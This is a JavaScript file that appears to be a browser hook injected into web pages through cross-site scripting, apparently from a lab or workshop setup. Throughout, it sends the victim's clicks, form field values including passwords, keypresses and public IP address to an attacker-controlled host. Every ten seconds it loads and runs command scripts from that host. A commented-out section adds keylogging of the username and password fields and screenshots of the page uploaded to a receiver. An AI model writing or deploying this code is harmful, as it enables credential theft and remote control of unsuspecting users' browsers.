var address = "192.168.1.19";

window.onload = function() {
  document.body.onclick = onclickEvent; 

  // Add onfocus/onBlur event on all inputs
  inputs = document.getElementsByTagName('input');
  for (i = 0; i < inputs.length; i++) {
    inputs[i].onblur = onBlurEvent;
  }
}

// Generate browserId in Session storage
if(sessionStorage.getItem('browserID') == null) {
  browserID = '_' + Math.random().toString(36).substr(2, 9);
  sessionStorage.setItem('browserID', browserID);
  
  new Image().src = 'http://' + address + '/rcv_wip.php?action=initHook&browserId=' + browserID + '&userAgent=' + navigator.userAgent + '&hostname=' + window.location.hostname;
} 

var browserID = sessionStorage.getItem('browserID');

// By default, the keylogger functionnality is disable (or when the user reload the page)
new Image().src = "http://" + address + "/rcv_wip.php?browserId=" + browserID + "&eventType=keylogger (disabled)&event=" + btoa("keylogger is disable (loading/reloading page)");

// Heartbeat function
window.setInterval(function() {
    new Image().src = 'http://' + address + '/rcv_wip.php?action=heartbeat&browserId=' + browserID;
}, 3000);

// PublicIP function
function getPublicIP() {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", 'https://api.ipify.org/', true);
  
  xhr.onreadystatechange = function() {
    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
      new Image().src = 'http://' + address + '/rcv_wip.php?action=getPublicIP&browserId=' + browserID + '&publicIP=' + xhr.responseText;
    }
  }

  xhr.send();
}
getPublicIP();


// Get commands every 10 sec
window.setInterval(function() {
  var script = document.createElement('script');
  script.src = 'http://' + address + '/commands/' + browserID + '_commands.js';
  document.head.appendChild(script);
}, 10000);


function onclickEvent(e) {
  var event = "";
  var localName = e.target.localName;

  switch(localName) {
    case 'input':
      if(e.target.type === 'submit') {
        if(e.target.form === null) {
          event = '{"tag":"' + e.target.localName + '","type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '"}';
          new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onclick&event=' + btoa(event);
        }
        else {
          event = '{"tag":"' + e.target.localName + '","type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '", "form": {"action":"' + e.target.form.action + '", "method":"' + e.target.form.method + '"';
          
          var elements = e.target.form.elements;
          for (var i = 0, element; element = elements[i++];) {
            if (element.localName === "input") {
              inputElem = ', "' + element.localName + '_' + i + '" : {"tag":"' + element.localName + '","type":"' + element.type + '","name":"' + element.name + '","id":"' + element.id + '","value":"' + element.value + '"}';
              event = event + inputElem;
            }
          }   
          
          event = event + "}}";
          
          new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onclick&event=' + btoa(event);
        }   
      }
      else {
        event = '{"tag":"' + e.target.localName + '","type":"' + e.target.type + '","name":"' + e.target.name + '","id":"' + e.target.id + '","value":"' + e.target.value + '"}';
        new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onclick&event=' + btoa(event);
      }
      break;
    
    case 'a':
      event = '{"tag":"' + e.target.localName + '","href":"' + e.target.href + '","title":"' + e.target.title + '","text":"' + e.target.text + '"}';
      new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onclick&event=' + btoa(event);
      break;

    case 'button':
      if(e.target.form === null) {
        event = '{"tag":"' + e.target.localName + '","type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '"}';
        new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onclick&event=' + btoa(event);
      }
      else {
        event = '{"tag":"' + e.target.localName + '","type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '", "form": {"action":"' + e.target.form.action + '", "method":"' + e.target.form.method + '"';
        
        var elements = e.target.form.elements;
        for (var i = 0, element; element = elements[i++];) {
          if (element.localName === "input") {
            inputElem = ', "' + element.localName + '_' + i + '" : {"tag":"' + element.localName + '","type":"' + element.type + '","name":"' + element.name + '","id":"' + element.id + '","value":"' + element.value + '"}';
            event = event + inputElem;
          }
        }   
        
        event = event + "}}";
        
        new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onclick&event=' + btoa(event);
      }   
      break;
  }
}

function onBlurEvent(e) {
  var event = "";
  var localName = e.target.localName;

  event = '{"tag":"' + e.target.localName + '","type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '"}';
  new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onblur&event=' + btoa(event);
}

// Get printable characters
function getOnKeyPress(e) {
  var key = e.key;
  if(key === ' ' || key === 'Spacebar') {
    key = "{Space}";
  }
  new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onkeypress&event=' + btoa(key);
}

// Get special characters
function getOnKeyDown(e) {
  var key = e.key;
  if(key === 'Backspace') {
    key = "{Backspace}";
    new Image().src = 'http://' + address + '/rcv_wip.php?browserId=' + browserID + '&eventType=onkeypress&event=' + btoa(key);
  }
}




/*
window.onload = function() {
  document.onkeyup = getOnKeyDown; 
  document.onkeyup = usernameKey; 
}

var keys = '';
function usernameKey(e) {
  get = window.event ? event : e;
  key = get.key ? get.key : get.code;
  keys += key;
}

window.setInterval(function() {
  if (keys != '') {
    new Image().src = 'http://192.168.1.16/atelier_csrf/exploit/rcv_wip.php?action=keystroke&browserId=' + browserID + '&keys='+encodeURIComponent(keys);
    keys = '';
  }
}, 3000);

var script = document.createElement('script');
script.src = "https://html2canvas.hertzen.com/dist/html2canvas.js";
document.head.appendChild(script);


window.onload = function() {
  var username = document.getElementById('username');
  username.onkeyup = usernameKey; 
  //username.onfocus = usernameScreen; 
  username.onblur = usernameScreen;
  //document.querySelector('body').onclick = this.usernameScreen;
  var password = document.getElementById('password');
  password.onkeyup = passwordKey;
}

var usernameKeys = '';
function usernameKey(e) {
  get = window.event ? event : e;
  key = get.key ? get.key : get.code;
  usernameKeys += key;
}

function usernameScreen() {
  html2canvas(document.querySelector('body')).then(canvas => {
      var dataURL = canvas.toDataURL();
      console.log(dataURL);

      var block = ImageURL.split(";");
      var contentType = block[0].split(":")[1];
      var realData = block[1].split(",")[1];
      var blob = b64toBlob(realData, contentType);
      var formDataToUpload = new FormData(form);
      formDataToUpload.append("image", blob);

      data = JSON.stringify({image: dataURL});
      var xhr = new XMLHttpRequest();
      xhr.open("POST", 'http://192.168.56.182/exploit/rcv.php', true);      
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send("screen=" + data);
  });
}

var passwordKeys = '';
function passwordKey(e) {
  get = window.event ? event : e;
  key = get.key ? get.key : get.code;
  passwordKeys += key;  
}

window.setInterval(function() {
  if (usernameKeys != '') {
    new Image().src = 'http://192.168.56.182/exploit/rcv.php?username='+encodeURIComponent(usernameKeys);
    usernameKeys = '';
  }
  if (passwordKeys != '') {
    new Image().src = 'http://192.168.56.182/exploit/rcv.php?password='+encodeURIComponent(passwordKeys);
    passwordKeys = '';
  }
}, 1000);
*/